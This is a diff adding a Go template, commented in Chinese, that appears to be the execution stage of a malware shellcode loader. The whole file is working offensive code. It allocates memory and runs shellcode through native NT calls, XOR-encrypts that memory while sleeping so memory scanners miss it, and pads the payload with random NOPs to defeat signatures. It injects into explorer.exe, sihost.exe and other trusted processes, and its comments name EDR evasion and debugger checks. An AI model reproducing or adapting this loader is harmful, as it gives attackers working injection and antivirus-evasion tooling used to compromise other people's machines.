@@ -1,0 +1,356 @@
+{{define "_execute"}}
+// ============================================================
+// 第4层：Shellcode 执行 + 进程注入
+// ============================================================
+
+// sleepObfuscate 在睡眠期间加密 shellcode 内存，规避内存扫描。
+// 流程：RX→RW → XOR加密 → sleep → XOR解密 → RW→RX
+func sleepObfuscate(address uintptr, size uintptr) {
+	if !enableObfuscate {
+		time.Sleep(5 * time.Second)
+		return
+	}
+	vp := getProcAddr(kernel32(), ds("{{index .EncodedStrings "VirtualProtect"}}"))
+	if vp == 0 {
+		time.Sleep(5 * time.Second)
+		return
+	}
+
+	key := make([]byte, 32)
+	for i := range key {
+		key[i] = byte(rand.Intn(256))
+	}
+	mem := (*[1 << 30]byte)(unsafe.Pointer(address))[:size:size]
+
+	// RX → RW
+	var oldProtect uint32
+	syscall.Syscall6(vp, 4, address, size, 0x04, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+
+	// 加密
+	for i := 0; i < len(mem); i++ {
+		mem[i] ^= key[i%32]
+	}
+
+	// 睡眠
+	time.Sleep(time.Duration(3000+rand.Intn(2000)) * time.Millisecond)
+
+	// 解密
+	for i := 0; i < len(mem); i++ {
+		mem[i] ^= key[i%32]
+	}
+
+	// RW → RX
+	syscall.Syscall6(vp, 4, address, size, 0x20, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+}
+
+func mutateShellcode(shellcode []byte) []byte {
+	if !enableMutate {
+		return shellcode
+	}
+	// 多种等效 NOP 指令，破坏静态特征
+	nopVariants := [][]byte{
+		{0x90},                    // NOP
+		{0x66, 0x90},              // 66 NOP
+		{0x0F, 0x1F, 0x00},       // NOP DWORD ptr [EAX]
+		{0x0F, 0x1F, 0x40, 0x00}, // NOP DWORD ptr [EAX+0]
+		{0x87, 0xC0},              // XCHG EAX, EAX
+		{0x86, 0xC9},              // XCHG CL, CL
+	}
+	nopCount := 2 + rand.Intn(6)
+	var prefix []byte
+	for i := 0; i < nopCount; i++ {
+		variant := nopVariants[rand.Intn(len(nopVariants))]
+		prefix = append(prefix, variant...)
+	}
+	mutated := make([]byte, 0, len(prefix)+len(shellcode))
+	mutated = append(mutated, prefix...)
+	mutated = append(mutated, shellcode...)
+	return mutated
+}
+
+// executeViaCallback 通过 EnumChildWindows 回调执行 shellcode。
+// 仅作为主执行方式失败时的备选方案。
+func executeViaCallback(addr uintptr) bool {
+	u32 := user32()
+	enumChildWindows := getProcAddr(u32, ds("{{index .EncodedStrings "EnumChildWindows"}}"))
+	getDesktopWindow := getProcAddr(u32, ds("{{index .EncodedStrings "GetDesktopWindow"}}"))
+	if enumChildWindows == 0 || getDesktopWindow == 0 {
+		return false
+	}
+	desktop, _, _ := syscall.Syscall(getDesktopWindow, 0, 0, 0, 0)
+	syscall.Syscall(enumChildWindows, 3, desktop, addr, 0)
+	return true
+}
+
+// executeShellcode 在当前进程中执行 shellcode。
+// 流程：NtAlloc(RW) → 分块复制 → [sleep混淆] → NtProtect(RX) → 二次调试检测 → NtCreateThreadEx
+func executeShellcode(shellcode []byte) {
+	defer func() { recover() }()
+
+	k32 := kernel32()
+	nt := ntdll()
+
+	// 分配内存 (RW) — 优先 NtAllocateVirtualMemory
+	var addr uintptr
+	ntAlloc := getProcAddr(nt, ds("{{index .EncodedStrings "NtAllocateVirtualMemory"}}"))
+	getCurProc := getProcAddr(k32, ds("{{index .EncodedStrings "GetCurrentProcess"}}"))
+	if ntAlloc != 0 && getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		var base uintptr
+		regionSize := uintptr(len(shellcode))
+		ret, _, _ := syscall.Syscall6(ntAlloc, 6, hProc,
+			uintptr(unsafe.Pointer(&base)), 0,
+			uintptr(unsafe.Pointer(&regionSize)),
+			0x3000, 0x04)
+		if ret == 0 && base != 0 {
+			addr = base
+		}
+	}
+	if addr == 0 {
+		vAlloc := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualAlloc"}}"))
+		if vAlloc == 0 {
+			return
+		}
+		addr, _, _ = syscall.Syscall6(vAlloc, 4, 0, uintptr(len(shellcode)), 0x3000, 0x04, 0, 0)
+		if addr == 0 {
+			return
+		}
+	}
+	// 分块复制 + 随机延迟
+	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))[:len(shellcode):len(shellcode)]
+	chunkSize := 512
+	for i := 0; i < len(shellcode); i += chunkSize {
+		end := i + chunkSize
+		if end > len(shellcode) {
+			end = len(shellcode)
+		}
+		copy(dst[i:end], shellcode[i:end])
+		if rand.Intn(10) > 7 {
+			time.Sleep(time.Duration(rand.Intn(10)) * time.Millisecond)
+		}
+	}
+
+	// 可选睡眠混淆
+	if enableObfuscate {
+		sleepObfuscate(addr, uintptr(len(shellcode)))
+	}
+
+	// RW → RX — 优先 NtProtectVirtualMemory
+	var oldProtect uint32
+	ntProtect := getProcAddr(nt, ds("{{index .EncodedStrings "NtProtectVirtualMemory"}}"))
+	if ntProtect != 0 && getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		base := addr
+		regionSize := uintptr(len(shellcode))
+		syscall.Syscall6(ntProtect, 5, hProc,
+			uintptr(unsafe.Pointer(&base)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			0x20, uintptr(unsafe.Pointer(&oldProtect)), 0)
+	} else {
+		vProtect := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualProtect"}}"))
+		if vProtect != 0 {
+			syscall.Syscall6(vProtect, 4, addr, uintptr(len(shellcode)),
+				0x20, uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+		}
+	}
+
+	// 执行前二次调试检测
+	if !checkDebugger() {
+		return
+	}
+
+	time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
+
+	// 优先：NtCreateThreadEx（更底层，部分 EDR 不 hook）
+	ntCreateThreadEx := getProcAddr(nt, ds("{{index .EncodedStrings "NtCreateThreadEx"}}"))
+	waitObj := getProcAddr(k32, ds("{{index .EncodedStrings "WaitForSingleObject"}}"))
+	if ntCreateThreadEx != 0 && getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		var hThread uintptr
+		ret, _, _ := syscall.Syscall12(ntCreateThreadEx, 11,
+			uintptr(unsafe.Pointer(&hThread)), 0x1FFFFF, 0,
+			hProc, addr, 0, 0, 0, 0, 0, 0, 0)
+		if ret == 0 && hThread != 0 {
+			if waitObj != 0 {
+				syscall.Syscall(waitObj, 2, hThread, 0xFFFFFFFF, 0)
+			}
+			return
+		}
+	}
+
+	// 备选：CreateThread
+	createThread := getProcAddr(k32, ds("{{index .EncodedStrings "CreateThread"}}"))
+	if createThread != 0 {
+		hThread, _, _ := syscall.Syscall6(createThread, 6, 0, 0, addr, 0, 0, 0)
+		if hThread != 0 && waitObj != 0 {
+			syscall.Syscall(waitObj, 2, hThread, 0xFFFFFFFF, 0)
+			return
+		}
+	}
+
+	// 最后备选：回调执行
+	executeViaCallback(addr)
+}
+// injectToProcess 将 shellcode 注入到合法进程中执行。
+func injectToProcess(shellcode []byte) bool {
+	k32 := kernel32()
+	nt := ntdll()
+
+	snap := getProcAddr(k32, ds("{{index .EncodedStrings "CreateToolhelp32Snapshot"}}"))
+	first := getProcAddr(k32, ds("{{index .EncodedStrings "Process32FirstW"}}"))
+	next := getProcAddr(k32, ds("{{index .EncodedStrings "Process32NextW"}}"))
+	openProc := getProcAddr(k32, ds("{{index .EncodedStrings "OpenProcess"}}"))
+	closeH := getProcAddr(k32, ds("{{index .EncodedStrings "CloseHandle"}}"))
+	if snap == 0 || first == 0 || openProc == 0 {
+		return false
+	}
+
+	targets := []string{"explorer.exe", "sihost.exe", "taskhostw.exe", "RuntimeBroker.exe"}
+
+	hSnap, _, _ := syscall.Syscall(snap, 2, 0x2, 0, 0)
+	if hSnap == ^uintptr(0) {
+		return false
+	}
+	defer syscall.Syscall(closeH, 1, hSnap, 0, 0)
+
+	var pe PROCESSENTRY32W
+	pe.Size = uint32(unsafe.Sizeof(pe))
+	var targetPid uint32
+
+	ret, _, _ := syscall.Syscall(first, 2, hSnap, uintptr(unsafe.Pointer(&pe)), 0)
+	if ret == 0 {
+		return false
+	}
+	for {
+		name := syscall.UTF16ToString(pe.ExeFile[:])
+		for _, t := range targets {
+			if name == t {
+				targetPid = pe.ProcessID
+				break
+			}
+		}
+		if targetPid != 0 {
+			break
+		}
+		ret, _, _ = syscall.Syscall(next, 2, hSnap, uintptr(unsafe.Pointer(&pe)), 0)
+		if ret == 0 {
+			break
+		}
+	}
+	if targetPid == 0 {
+		return false
+	}
+
+	// 打开目标进程 — 最小权限
+	// PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION
+	const minInjectAccess = 0x0002 | 0x0008 | 0x0020 | 0x0010 | 0x0400
+	hProcess, _, _ := syscall.Syscall(openProc, 3, minInjectAccess, 0, uintptr(targetPid))
+	if hProcess == 0 {
+		return false
+	}
+	defer syscall.Syscall(closeH, 1, hProcess, 0, 0)
+	// 分配远程内存 — 优先 NtAllocateVirtualMemory
+	var remoteAddr uintptr
+	ntAlloc := getProcAddr(nt, ds("{{index .EncodedStrings "NtAllocateVirtualMemory"}}"))
+	if ntAlloc != 0 {
+		var base uintptr
+		regionSize := uintptr(len(shellcode))
+		ret, _, _ := syscall.Syscall6(ntAlloc, 6, hProcess,
+			uintptr(unsafe.Pointer(&base)), 0,
+			uintptr(unsafe.Pointer(&regionSize)),
+			0x3000, 0x04)
+		if ret == 0 && base != 0 {
+			remoteAddr = base
+		}
+	}
+	if remoteAddr == 0 {
+		vAllocEx := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualAllocEx"}}"))
+		if vAllocEx == 0 {
+			return false
+		}
+		remoteAddr, _, _ = syscall.Syscall6(vAllocEx, 5, hProcess, 0,
+			uintptr(len(shellcode)), 0x3000, 0x04, 0)
+		if remoteAddr == 0 {
+			return false
+		}
+	}
+
+	// 写入 shellcode — 优先 NtWriteVirtualMemory
+	ntWrite := getProcAddr(nt, ds("{{index .EncodedStrings "NtWriteVirtualMemory"}}"))
+	if ntWrite != 0 {
+		var written uintptr
+		ret, _, _ := syscall.Syscall6(ntWrite, 5, hProcess, remoteAddr,
+			uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),
+			uintptr(unsafe.Pointer(&written)), 0)
+		if ret != 0 {
+			return false
+		}
+	} else {
+		wpm := getProcAddr(k32, ds("{{index .EncodedStrings "WriteProcessMemory"}}"))
+		if wpm == 0 {
+			return false
+		}
+		var written uintptr
+		ret, _, _ := syscall.Syscall6(wpm, 5, hProcess, remoteAddr,
+			uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)),
+			uintptr(unsafe.Pointer(&written)), 0)
+		if ret == 0 {
+			return false
+		}
+	}
+
+	// RW → RX
+	ntProtect := getProcAddr(nt, ds("{{index .EncodedStrings "NtProtectVirtualMemory"}}"))
+	if ntProtect != 0 {
+		base := remoteAddr
+		regionSize := uintptr(len(shellcode))
+		var oldProtect uint32
+		syscall.Syscall6(ntProtect, 5, hProcess,
+			uintptr(unsafe.Pointer(&base)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			0x20, uintptr(unsafe.Pointer(&oldProtect)), 0)
+	} else {
+		vpEx := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualProtectEx"}}"))
+		if vpEx != 0 {
+			var oldProtect uint32
+			syscall.Syscall6(vpEx, 5, hProcess, remoteAddr,
+				uintptr(len(shellcode)), 0x20,
+				uintptr(unsafe.Pointer(&oldProtect)), 0)
+		}
+	}
+
+	// 创建远程线程 — 优先 NtCreateThreadEx
+	waitObj := getProcAddr(k32, ds("{{index .EncodedStrings "WaitForSingleObject"}}"))
+	ntCreateThreadEx := getProcAddr(nt, ds("{{index .EncodedStrings "NtCreateThreadEx"}}"))
+	if ntCreateThreadEx != 0 {
+		var hThread uintptr
+		ret, _, _ := syscall.Syscall12(ntCreateThreadEx, 11,
+			uintptr(unsafe.Pointer(&hThread)), 0x1FFFFF, 0,
+			hProcess, remoteAddr, 0, 0, 0, 0, 0, 0, 0)
+		if ret == 0 && hThread != 0 {
+			if waitObj != 0 {
+				syscall.Syscall(waitObj, 2, hThread, 0xFFFFFFFF, 0)
+			}
+			syscall.Syscall(closeH, 1, hThread, 0, 0)
+			return true
+		}
+	}
+
+	// 备选：CreateRemoteThread
+	crt := getProcAddr(k32, ds("{{index .EncodedStrings "CreateRemoteThread"}}"))
+	if crt == 0 {
+		return false
+	}
+	var tid uint32
+	hThread, _, _ := syscall.Syscall9(crt, 7, hProcess, 0, 0, remoteAddr, 0, 0,
+		uintptr(unsafe.Pointer(&tid)), 0, 0)
+	if hThread == 0 {
+		return false
+	}
+	if waitObj != 0 {
+		syscall.Syscall(waitObj, 2, hThread, 0xFFFFFFFF, 0)
+	}
+	syscall.Syscall(closeH, 1, hThread, 0, 0)
+	return true
+}
+{{end}}
